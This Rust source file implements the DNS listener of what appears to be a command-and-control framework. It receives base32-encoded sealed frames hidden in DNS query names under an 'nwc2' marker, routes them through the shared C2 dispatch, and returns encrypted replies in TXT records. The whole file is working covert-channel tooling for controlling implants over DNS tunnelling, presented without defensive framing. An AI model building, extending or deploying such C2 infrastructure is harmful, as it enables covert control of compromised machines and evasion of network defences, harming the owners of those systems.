use std::sync::Arc;

use nw_profile::dns;

use crate::channels::process_sealed;
use crate::queue::SharedQueue;
use crate::server::ServerState;
use crate::session::SharedRegistry;

/// UDP DNS C2 listener. Parses `QNAME = <b32chunks>.nwc2`, decodes the sealed
/// frame, shares the HTTP/TCP dispatch, and replies with a TXT record holding
/// base32(sealed reply).
pub async fn serve_dns(
    registry: SharedRegistry,
    queue: SharedQueue,
    psk: Vec<u8>,
    bind: String,
) -> anyhow::Result<()> {
    let state = ServerState {
        registry,
        queue,
        psk: Arc::new(psk),
        files: crate::filestore::FileStore::default(),
        uploads: crate::uploadstore::UploadStore::default(),
    };
    let sock = Arc::new(tokio::net::UdpSocket::bind(&bind).await?);
    tracing::info!(bind, "c2 dns listener up");
    let mut buf = vec![0u8; 4096];
    loop {
        let (n, peer) = sock.recv_from(&mut buf).await?;
        let mut req = vec![0u8; n];
        req.copy_from_slice(&buf[..n]);
        let st = state.clone();
        let s = sock.clone();
        tokio::spawn(async move {
            let resp = handle_packet(&st, &req).await;
            let _ = s.send_to(&resp, peer).await;
        });
    }
}

async fn handle_packet(state: &ServerState, packet: &[u8]) -> Vec<u8> {
    let (id, labels) = match dns::parse_query(packet) {
        Ok(v) => v,
        Err(e) => {
            tracing::warn!("dns parse: {e}");
            return dns::encode_txt_response(0, &["err".into()], "");
        }
    };
    // Reconstruct base32 from labels up to the nwc2 marker.
    let end = labels
        .iter()
        .position(|l| l == dns::MARKER)
        .unwrap_or(labels.len());
    let b32 = labels[..end].join("");
    let query_labels = &labels; // echo the original qname in the reply
    let reply = match dns::base32_decode(&b32) {
        Ok(sealed) => process_sealed(state, &sealed).await.ok(),
        Err(_) => None,
    };
    match reply {
        Some(reply) => {
            let reply_b32 = dns::base32_encode(&reply);
            dns::encode_txt_response(id, query_labels, &reply_b32)
        }
        None => {
            tracing::warn!("dns bad payload");
            dns::encode_txt_response(id, query_labels, "")
        }
    }
}
